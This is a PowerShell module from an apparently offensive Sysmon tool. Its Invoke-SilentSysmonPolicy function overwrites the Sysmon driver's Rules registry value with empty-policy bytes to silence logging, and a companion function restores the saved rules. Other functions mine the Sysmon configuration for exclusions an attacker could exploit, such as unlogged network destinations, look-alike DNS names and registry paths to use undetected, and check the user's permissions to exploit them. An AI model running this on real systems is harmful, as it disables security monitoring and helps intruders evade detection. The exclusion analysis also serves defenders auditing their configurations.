function Invoke-SilentSysmonPolicy
{
    <#
    .SYNOPSIS
        Silences Sysmon policy by replacing rules registry value with binary value represents empty policy
        from version database.

    .DESCRIPTION
        Disables Sysmon event logging by replacing the active Sysmon rule bytes with version-specific
        empty policy bytes stored in the JSON database. Stores the original rules for later reversion.

    .PARAMETER sysmonVersion
        The version of Sysmon currently installed (e.g., "15.0", "14.14").

    .OUTPUTS
        Confirmation message if silencing succeeds.

    .NOTES
        - Requires administrator privileges
        - Stores original rules in $Global:origRuleBytes for reversion, session persistence only
        - Uses version database to find matching empty policy bytes
        - Writes to registry value: HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters\Rules
    #>
    param(
        [Parameter(Mandatory=$true)]$sysmonVersion
    )
    $sysmonRuleKey = 'HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters'
    $sysmonRuleValue = 'Rules'

    if (-not $sysmonVersion)
    {
        Write-ErrorMessage -Message "[!] Cannot find Sysmon version, Exiting..."
        break
    }

    Write-InfoMessage -Message "[*] Searching for rule bytes for your version ..."
    $closestSysmonVersion = ($SysmonVersions | Where-Object { [double]$_.SysmonVersion -le [double]$sysmonVersion } | Sort-Object { [double]$_.SysmonVersion } -Descending)[0].SysmonVersion
    if ($closestSysmonVersion -ne $sysmonVersion)
    {
        Write-ErrorMessage -Message "[!] Your Sysmon version doesn't have an information in the database."
        Write-InfoMessage -Message "[*] The closest version is $closestSysmonVersion"
        if ((Get-UserResponse -Message "Do you wish to continue with the closest version? (y/n)") -eq 'n') { break }
    }
    else
    {
        Write-SuccessMessage -Message "[+] Rule bytes for Sysmon version $sysmonVersion were found in the database"
    }
    
    $ruleByte = ($SysmonVersions | Where-Object { $_.SysmonVersion -eq $closestSysmonVersion } | Select-Object ByteRule).ByteRule

    try {
        Write-InfoMessage -Message "[*] Trying to read Sysmon rule bytes ..."
        $sysmonRuleBytes = Get-ItemPropertyValue -Path $sysmonRuleKey -Name $sysmonRuleValue -ErrorAction Stop
        if (-not (Compare-Object $sysmonRuleBytes $ruleByte -SyncWindow 0))
        {
            Write-WarningMessage -Message "[!] Sysmon rules seems to look like the spoofed rules"
            if ((Get-UserResponse -Message "Do you want to continue? (y/n)") -eq 'n') { break }
        }
        Write-InfoMessage -Message "[*] Saving current Sysmon rules ..."
        $Global:origRuleBytes = $sysmonRuleBytes
    }
    
    catch { Write-ErrorMessage -Message '[!] Error while trying to read Sysmon rule bytes, try open as Admin'; break }
    
    try {
        Set-ItemProperty -Path $sysmonRuleKey -Name $sysmonRuleValue -Value $ruleByte -Force
        Write-SuccessMessage -Message "[+] New rules written, now Sysmon is silenced :)"
    }

    catch { Write-ErrorMessage -Message '[!] Error while trying to write Sysmon rule bytes, try open as Admin'; break }
}


function Invoke-RevertSysmonPolicy
{
    <#
    .SYNOPSIS
        Restores original Sysmon policy from saved backup in global memory.

    .DESCRIPTION
        Reverts Sysmon event logging to the original configuration by writing previously saved
        rule bytes back to the registry. Must be called after Invoke-SilentSysmonPolicy to restore
        monitoring capabilities. The original rules must be stored in $Global:origRuleBytes.

    .OUTPUTS
        Confirmation message if reversion succeeds.

    .NOTES
        - Requires administrator privileges
        - Depends on $Global:origRuleBytes being populated by a prior Silent operation
        - Affects registry value: HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters\Rules
        - Restores full Sysmon event logging
    #>
    $sysmonRuleKey = 'HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters'
    $sysmonRuleValue = 'Rules'

    if (-not $Global:origRuleBytes) { Write-ErrorMessage -Message "[-] Cannot revert Sysmon policy, original rule bytes weren't saved" }

    else {
        try {
            Set-ItemProperty -Path $sysmonRuleKey -Name $sysmonRuleValue -Value $Global:origRuleBytes -Force   
            Write-SuccessMessage "[+] Successfully reverted Sysmon policy"
        }
        catch {
            Write-ErrorMessage -Message '[!] Error while trying to revert Sysmon policy, try open as Admin'; break
        }
    }
}


function Invoke-NetworkConnect
{
    <#
    .SYNOPSIS
        Analyzes Sysmon Event 3 (NetworkConnect) exclusions.

    .DESCRIPTION
        Evaluates network connection event rules to identify excluded processes, IPs, and ports
        that could hide attacker's C2 traffic, data exfiltration, etc.
        Checks file write/execute permissions on excluded executables to assess compromise scope.
        Critical for detecting network-based attack infrastructure.

    .PARAMETER Option
        Analysis mode: 1 = Rule parsing, 2 = High-risk analysis, 3 = Write permission check, 4 = Execute permission check, 5 = Network element analysis

    .OUTPUTS
        Rule tables, attack vectors, and permission analysis based on selected option.

    .NOTES
        - Event ID: 3 (NetworkConnect)
        - Excluded binaries with execute permissions can perform undetected C2 communication
    #>
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )    
    $id = $EventDic["NetworkConnect"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the files, IP addresses or ports that will be logged when they create connections:" `
            -ExcludeMessage "This table contains the files, IP addresses or ports that will not be logged when they create connections:"
    }

    if ($Option -eq 2)
    {
        Invoke-DisplayHighVectorRules -EventId $id
    }

    if ($Option -eq 3)
    {
        Invoke-CheckFileWritePermissions
    }

    if ($Option -eq 4)
    {
        Invoke-CheckFileExecutePermissions
    }

    if ($Option -eq 5)
    {
        $exclude_table = $event_tables[$id-1][$EXCLUDE_INDEX]
        
        $queries = Invoke-CheckDnsQuery -CheckTable $exclude_table -id $id
        Write-InfoMessage -Message "[*] Check for unsecure queries - queries that filtered by 'end with' condition but doesn't have '.' at the beggining of the query"
        Write-InfoMessage -Message "    Might be helpful for the attacker, for example: if microsoft.com is excluded, the attacker can register attacker-microsoft.com and it won't be logged.`n"
        if ($queries.Count) 
        { 
            Write-SuccessMessage -Message "[+] Found unsecure queries:`n"
            $queries | ForEach-Object { Write-SuccessMessage -Message "$_" } 
        }
        else { Write-ErrorMessage -Message "[-] No unsecure queries found" }

        Write-InfoMessage -Message "`n[*] Check for network elements"
        Write-InfoMessage -Message "    Might be helpful for the attacker, for example: if the field `"DestinationPort`" is excluded, every connection to this port will not be logged.`n"
        $networkTable = Invoke-NetworkCheck -CheckTable $exclude_table
        if ($networkTable.Rows.Count)
        {
            Write-SuccessMessage -Message "`n[+] Found network elements that can be useful for the attacker:"
            Show-Table -Table $networkTable
        }
        else { Write-ErrorMessage -Message "[-] No network elements found" }
    }
}


function Invoke-NetworkCheck
{
    param(
        [Parameter(Mandatory=$true)]$CheckTable
    )
    
    $networkFields = @("Protocol", "SourceIp", "DestinationIp", "SourceHostname", "DestinationHostname",
                       "SourcePort", "DestinationPort", "SourcePortName", "DestinationPortName")
    $networkTable = New-Object System.Data.DataTable
    [void]$networkTable.Columns.Add("Field")
    [void]$networkTable.Columns.Add("Value")

    $CheckTable | ForEach-Object {
        $field = $_.Field
        $value = $_.Value
        if ($field -in $networkFields) { [void]$networkTable.Rows.Add($field, $value) }
    }

    return $networkTable
}


function Invoke-DriverLoad
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
        
    $id = $EventDic["DriverLoad"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the drivers that will be logged if loaded into kernel:" `
            -ExcludeMessage "This table contains the drivers that will not be logged if loaded into kernel:"
    }

    if ($Option -eq 2)
    {
        $exclude_table = $event_tables[$id-1][$EXCLUDE_INDEX]
        if ($exclude_table.Rows.Count) { Invoke-CheckSignatureStatus -CheckTable $exclude_table -type "exclude" }
    }
}


function Invoke-CheckSignatureStatus
{
    param(
        [Parameter(Mandatory=$true)]$CheckTable,
        [Parameter(Mandatory=$true)][string]$type
    )
    
    $id = $EventDic["DriverLoad"]
    $SigTable = New-Object System.Data.DataTable
    [void]$SigTable.Columns.Add("Condition")
    [void]$SigTable.Columns.Add("Value")
    $sig = $null
    $isSigStatus = $false

    # External check - signatures without "SignatureStatus" check
    foreach ($Row in $CheckTable.Rows)
    {
        if ($Row.Field -eq "Signature")
        {
            $condition = $Row.Condition
            $value = $Row.Value
            $SigTable.Rows.Add($condition, $value) | Out-Null
        }
    }

    if ($type -eq "exclude") { $id += 25 }

    foreach ($RuleNode in $RuleDic[$id])
    {
        
        if ($RuleNode.GetType().Name -eq "String")
        {
            $groupRelation = $RuleNode.ToUpper()
        }

        # Rule Tuple
        else
        {
            $field = $RuleNode.Item(0)
            $condition = $RuleNode.Item(1)
            $value = $RuleNode.Item(2)
            if ($groupRelation -eq "AND") {
                if ($field -eq "Signature") { $sig = @($condition, $value) }
                if (($field -eq "SignatureStatus") -and ($condition -eq "Valid")) { $isSigStatus = $true }
            }
            if ($isSigStatus)
            {
                $SigTable.Rows.Add($sig[0], $sig[1]) | Out-Null
            }
            $sig = $null
        }
    }

    if ($SigTable.Rows.Count -ne 0)
    {
        Write-SuccessMessage -Message "`n[+] This table contains drivers' signatures that their status (Valid/Invalid) will not be checked:"
        Show-Table -Table $SigTable
    }
}


function Invoke-ImageLoad
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
        
    $id = $EventDic["ImageLoad"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the images (components like DLL, OCX etc.) that will be logged if loaded into kernel:" `
            -ExcludeMessage "This table contains the images (components like DLL, OCX etc.) that will not be logged if loaded into kernel:"
    }
}


function Invoke-RawAccessRead
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
       
    $id = $EventDic["RawAccessRead"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the processes that will be logged if perfomed read operations on drives:" `
            -ExcludeMessage "This table contains the processes that will not be logged if perfomed read operations on drives:"
    }
}


function Invoke-RegistryEvent
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
    
    $id = $EventDic["RegistryEvent"]
    $include_table = $event_tables[$id-1][$INCLUDE_INDEX]
    $exclude_table = $event_tables[$id-1][$EXCLUDE_INDEX]

    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        try { [void]$Table.Columns.Remove("Attack Vector") }
        catch {}

        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the registry paths you should avoid to use to `nadd/delete registry object, set registry value or rename registry object:" `
            -ExcludeMessage "This table contains the registry paths you should use to `nadd/delete registry object, set registry value or rename registry object:"
    }

    elseif ($Option -eq 2)
    {
        Invoke-DisplayHighVectorRules -EventId $id
    }

    else
    {
        $reg_path = Read-Host "Enter registry path to check"

        if ($Option -eq 3) { Invoke-RegAddObj -reg_path $reg_path }

        if ($Option -eq 4) { Invoke-RegDeleteObj -reg_path $reg_path }

        if ($Option -eq 5) { Invoke-RegSetValue -reg_path $reg_path }

        if ($Option -eq 6) { Invoke-RegRenameObj -reg_path $reg_path }
    }
}


function Invoke-RegAddObj
{
    param(
        [Parameter(Mandatory=$true)][string]$reg_path
    )
    
    if (Test-Path -Path $reg_path)
    {
        $users = Get-Permissions -Path $reg_path -ReqPermission $Rights.REG_CREATE
            
        if ($users.Count)
        {
            $WhoamiUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            Write-SuccessMessage -Message "`n[+] Users/Groups that have permission to add a registry object:`n"
            foreach ($user in $users)
            {
                Write-SuccessMessage -Message $user
            }
            Write-InfoMessage -Message "[*] Check if those permissions applies to 'This key only'/'This key and subkeys'/'Subkeys only'`n`t(go to Permissions->Advanced)"

            if ($users -icontains $WhoamiUser) { Write-SuccessMessage -Message "`n[+] YOU ($WhoamiUser) have permission to add a registry object from path $reg_path" }
            else { 
                Write-ErrorMessage -Message "`n[-] YOU ($WhoamiUser) don't have permission to add a registry object from path $reg_path"
                Write-InfoMessage -Message "[*] Check if you are in one of the accessed groups"
            }
        }

        else { Write-ErrorMessage -Message "`n[-] No users have permission to add a registry object`n" }
    }

    else { Write-ErrorMessage -Message "`n[-] Path does not exist`n" }
}


function Invoke-RegDeleteObj
{
    param(
        [Parameter(Mandatory=$true)][string]$reg_path
    )
    
    if (Test-Path -Path $reg_path)
    {
        $users = Get-Permissions -Path $reg_path -ReqPermission $Rights.REG_DELETE
            
        if ($users.Count)
        {
            $WhoamiUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            Write-SuccessMessage -Message "`n[+] Users/Groups that have permission to delete a registry object:`n"
            foreach ($user in $users)
            {
                Write-SuccessMessage -Message $user
            }
            Write-InfoMessage -Message "[*] Check if those permissions applies to 'This key only'/'This key and subkeys'/'Subkeys only'`n`t(go to Permissions->Advanced)"

            if ($users -icontains $WhoamiUser) { Write-Host "`n[+] YOU ($WhoamiUser) have permission to delete a registry object from path $reg_path" }
            else { 
                Write-ErrorMessage -Message "`n[-] YOU ($WhoamiUser) don't have permission to delete a registry object from path $reg_path"
                Write-InfoMessage -Message "[*] Check if you are in one of the accessed groups"
            }
        }

        else { Write-ErrorMessage -Message "`n[-] No users have permission to delete a registry object`n" }
    }

    else { Write-ErrorMessage -Message "`n[-] Path does not exist`n" }
}


function Invoke-RegSetValue
{
    param(
        [Parameter(Mandatory=$true)][string]$reg_path
    )
    
    if (Test-Path -Path $reg_path)
    {
        $users = Get-Permissions -Path $reg_path -ReqPermission $Rights.REG_SET
            
        if ($users.Count)
        {
            $WhoamiUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            Write-SuccessMessage -Message "`n[+] Users/Groups that have permission to set a registry value:`n"
            foreach ($user in $users)
            {
                Write-SuccessMessage -Message $user
            }
            Write-InfoMessage "[*] Check if those permissions applies to 'This key only'/'This key and subkeys'/'Subkeys only'`n`t(go to Permissions->Advanced)"

            if ($users -icontains $WhoamiUser) { Write-Host "`n[+] YOU ($WhoamiUser) have permission to set a registry value from path $reg_path" }
            else { 
                Write-ErrorMessage -Message "`n[-] YOU ($WhoamiUser) don't have permission to set a registry value from path $reg_path" 
                Write-InfoMessage -Message "[*] Check if you are in one of the accessed groups"
            }
        }

        else { Write-ErrorMessage -Message "`n[-] No users have permission set a registry value`n" }
    }

    else { Write-ErrorMessage -Message "`n[-] Path does not exist`n" }
}


function Invoke-RegRenameObj
{
    param(
        [Parameter(Mandatory=$true)][string]$reg_path
    )
    
    if (Test-Path -Path $reg_path)
    {
        $users = Get-Permissions -Path $reg_path -ReqPermission $Rights.REG_RENAME
            
        if ($users.Count)
        {
            $WhoamiUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            Write-SuccessMessage -Message "`n[+] Users/Groups that have permission to rename a registry object:`n"
            foreach ($user in $users)
            {
                Write-SuccessMessage -Message $user
            }
            Write-InfoMessage -Message "[*] Check if those permissions applies to 'This key only'/'This key and subkeys'/'Subkeys only'`n`t(go to Permissions->Advanced)"

            if ($users -icontains $WhoamiUser) { Write-Host "`n[+] YOU ($WhoamiUser) have permission to rename a registry object from path $reg_path" }
            else { 
                Write-ErrorMessage -Message "`n[-] YOU ($WhoamiUser) don't have permission to rename a registry object from path $reg_path"
                Write-InfoMessage -Message "[*] Check if you are in one of the accessed groups"
            }
        }

        else { Write-ErrorMessage -Message "`n[-] No users have permission set a registry value`n" }
    }

    else { Write-ErrorMessage -Message "`n[-] Path does not exit`n" }
}


function Invoke-PipeEvent
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
        
    $id = $EventDic["PipeEvent"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the pipe names that will be logged if created/made a connection:" `
            -ExcludeMessage "This table contains the pipe names that will not be logged if created/made a connection:"
    }
}


function Invoke-WmiEvent
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
        
    $id = $EventDic["WmiEvent"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the WMI event filters & WMI event consumers that will be logged if registered or binded to each other:" `
            -ExcludeMessage "This table contains the WMI event filters & WMI event consumers that will not be logged if registered or binded to each other:"
    }
}


function Invoke-DnsQuery
{
    param(
        [Parameter(Mandatory=$true)][int]$Option
    )
    
    $id = $EventDic["DnsQuery"]
    
    Write-EventDescription -Description $InfoDic[$id]

    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the DNS queries that will be logged if created:" `
            -ExcludeMessage "This table contains the DNS queries that will not be logged if created:"
    }

    if ($Option -eq 2)
    {
        Invoke-DisplayHighVectorRules -EventId $id
    }

    if ($Option -eq 3)
    {
        $exclude_table = $event_tables[$id-1][$EXCLUDE_INDEX]
        $queries = Invoke-CheckDnsQuery -CheckTable $exclude_table -id $id
        Write-InfoMessage -Message "[*] Check for unsecure queries - queries that filtered by 'end with' condition but doesn't have '.' at the beggining of the query"
        Write-InfoMessage -Message "    Might be helpful for the attacker, for example: if microsoft.com is excluded, the attacker can register attacker-microsoft.com and it won't be logged.`n"
        if ($queries.Count) 
        { 
            Write-SuccessMessage -Message "[+] Found unsecure queries:`n"
            $queries | ForEach-Object { Write-SuccessMessage -Message "$_" } 
        }
        else { Write-ErrorMessage -Message "[-] No unsecure queries found" }   
    }
}


function Invoke-CheckDnsQuery
{
    param(
        [Parameter(Mandatory=$true)]$CheckTable,
        [Parameter(Mandatory=$true)][int]$id
    )
    
    # External check - DNS queries with condition "end with" but without . at the beggining of the query
    # Might be helpful for the attacker, for example: if microsoft.com is excluded, the attacker can register attacker-microsoft.com and it won't be logged.

    $params = @()
    switch ($id) {
        3 { $params = @("DestinationHostname", "SourceHostname") }
        Default { $params += "QueryName" }
    }

    $dns_queries = @()

    foreach ($Row in $CheckTable.Rows)
    {
        if (($Row.Field -in $params) -and ($Row.Condition -eq "end with") -and (-not $Row.Value.StartsWith(".")))
        {
            $dns_queries += $Row.Value
        }
    }

    return $dns_queries
}


function Invoke-ClipboardChange
{
    param(
        [Parameter(Mandatory=$true)][int]$Option,
        [Parameter(Mandatory=$true)][string]$ArchiveDirectory
    )
    
    $id = $EventDic["ClipboardChange"]

    Write-EventDescription -Description $InfoDic[$id]
    
    if ($Option -eq 1)
    {
        Invoke-DisplayEventRules -EventId $id `
            -IncludeMessage "This table contains the processes that will be logged if changed the clipboard content:" `
            -ExcludeMessage "This table contains the processes that will not be logged if changed the clipboard content:"
    }

    if ($Option -eq 3)
    {
        if ($ArchiveDirectory) { 
            Write-WarningMessage -Message "[!] Found Archive Directory: $ArchiveDirectory"
            Write-WarningMessage -Message "[!] All included clipboard changes will be archived to this directory`n"
        
            Write-InfoMessage -Message "[*] Checking users/groups permissions at archive directory...`n"
            if (Test-Path -Path $ArchiveDirectory)
            {
                $permissions = Get-PermissionString -Path $ArchiveDirectory

                if ($permissions)
                {
                    Write-SuccessMessage -Message "`n[+] Users/Groups Permissions:`n"
                    Write-SuccessMessage -Message $permissions

                    Write-InfoMessage -Message "`n[*] Check if you are in one of the accessed groups"
                }

                else { Write-ErrorMessage -Message "`n[-] No users/groups have permissions`n" }
            }

            else { Write-ErrorMessage -Message "`n[-] Path does not exist`n" }
        }

        else { Write-InfoMessage -Message "[*] No Archive Directory found`n" }
    }
}

Export-ModuleMember -Function Invoke-NetworkConnect,Invoke-DriverLoad,Invoke-CheckSignatureStatus,Invoke-ImageLoad
Export-ModuleMember -Function Invoke-RawAccessRead,Invoke-RegistryEvent,Invoke-RegAddObj,Invoke-RegDeleteObj,Invoke-RegSetValue,Invoke-RegRenameObj
Export-ModuleMember -Function Invoke-SilentSysmonPolicy, Invoke-RevertSysmonPolicy
Export-ModuleMember -Function Invoke-PipeEvent,Invoke-WmiEvent,Invoke-DnsQuery,Invoke-CheckDnsQuery,Invoke-ClipboardChange
